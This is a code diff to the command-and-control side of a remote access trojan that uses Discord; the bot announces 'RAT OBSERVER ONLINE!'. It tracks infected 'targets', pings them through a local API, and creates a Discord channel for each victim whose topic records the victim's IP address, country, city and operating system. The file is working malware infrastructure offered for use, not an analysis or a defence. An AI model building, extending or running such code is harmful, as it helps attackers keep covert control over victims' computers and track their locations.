@@ -1,6 +1,7 @@
 from asyncio import sleep
 import asyncio
 import os
+import platform
 import re
 import json
 import threading
@@ -8,6 +9,7 @@ import time
 import discord
 from discord.ext import commands
 from dotenv import load_dotenv
+from features.func import get_ip, get_location
 from features.setup import generate_uuid
 import requests
 import sched
@@ -18,15 +20,26 @@ __DISCORD_TARGETS_CHANNEL_ID    = int(os.environ.get("DISCORD_TARGETS_CHANNEL_ID
 __DISCORD_GUILD_ID              = int(os.environ.get("DISCORD_GUILD_ID")) # should be in int type!
 __DISCORD_OBSERVER_TOKEN        = os.environ.get("DISCORD_OBSERVER_TOKEN") # should be in string type!
 __API_BASE                      = "http://localhost:8000/api"
-_CHECK_TARGETS_DELAY            = 10
-_CHECK_TARGET_TIMEOUT           = 5
+__CHECK_TARGETS_DELAY            = 10
+__CHECK_TARGET_TIMEOUT           = 5
+bot = commands.Bot(command_prefix="!")
 
-def __get_targets_channel_by_id(bot):
+
+def __get_channel_by_id(channel_id):
     guild = bot.get_guild(__DISCORD_GUILD_ID)
-    return discord.utils.get(guild.channels, id=__DISCORD_TARGETS_CHANNEL_ID)
+    return discord.utils.get(guild.channels, id=channel_id)
 
 
-async def __check_target_status(bot, ctx):
+def check_if_channel_exists(channel_id):
+    guild = bot.get_guild(__DISCORD_GUILD_ID)
+    channel = discord.utils.get(guild.channels, id=channel_id)
+
+    if channel:
+        return True
+    return False
+
+
+async def __check_target_status(ctx):
     message_check = 'pong!'
 
     def check(message):
@@ -35,7 +48,7 @@ async def __check_target_status(bot, ctx):
     online = True
 
     try:
-        await bot.wait_for('message', timeout=_CHECK_TARGET_TIMEOUT, check=check)
+        await bot.wait_for('message', timeout=__CHECK_TARGET_TIMEOUT, check=check)
     except asyncio.TimeoutError:
         online = False
 
@@ -44,30 +57,48 @@ async def __check_target_status(bot, ctx):
     if response.text:
         message = json.loads(response.text)
         message_id = message['message_id']
-        target_channel = __get_targets_channel_by_id(bot)
+        target_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
         target_message = await target_channel.fetch_message(message_id)
         json_content = json.loads(target_message.content)
         json_content['online'] = online
         await target_message.edit(content = json.dumps(json_content))
 
 
-def check_targets():
+async def check_targets():
     response = requests.get(f"{__API_BASE}/targets")
 
     if response.text:
         targets = json.loads(response.text)
-
+        
         for target in targets:
-            requests.get(f"{__API_BASE}/ping/{target['identifier']}")
+            if check_if_channel_exists(target['channel_id']):
+                requests.get(f"{__API_BASE}/ping/{target['identifier']}")
+            else:
+                await create_target_text_channel(target)
+
+
+async def create_target_text_channel(target_data):
+    guild = bot.get_guild(__DISCORD_GUILD_ID)
+    target_channel = await guild.create_text_channel(target_data['identifier'], topic=f"IP: {target_data['metadata']['ip']} | COUTRY: {target_data['metadata']['country']} | CITY: {target_data['metadata']['city']} | OS: {target_data['metadata']['os']}")
+    print(f"Created new channel: {target_channel}")
+
+    targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
+    targets = await targets_channel.history().flatten()
+
+    for target in targets:
+        target_message_data = json.loads(target.content)
+
+        if target_data['channel_id'] == target_message_data['channel_id']:
+            await target.delete()
+
+    await check_targets()
 
 
 def main():
-    bot = commands.Bot(command_prefix="!")
-
     @bot.event
     async def on_ready():
         print('RAT OBSERVER ONLINE!')
-        check_targets()
+        await check_targets()
 
     @bot.event
     async def on_message(message):
@@ -79,8 +110,7 @@ def main():
 
     @bot.event
     async def on_guild_channel_create(channel):
-        guild = channel.guild
-        targets_channel = discord.utils.get(guild.text_channels, id=__DISCORD_TARGETS_CHANNEL_ID)
+        targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
         
         # get target metadata to json
         tmp = re.split(r'\s+\|\s+', channel.topic)
@@ -100,8 +130,9 @@ def main():
         
     @bot.command()
     async def ping(ctx):
-        await __check_target_status(bot, ctx)
-        threading.Timer(_CHECK_TARGETS_DELAY, check_targets).start()
+        await __check_target_status(ctx)
+        await asyncio.sleep(__CHECK_TARGETS_DELAY)
+        await check_targets()
 
 
     bot.run(__DISCORD_OBSERVER_TOKEN)
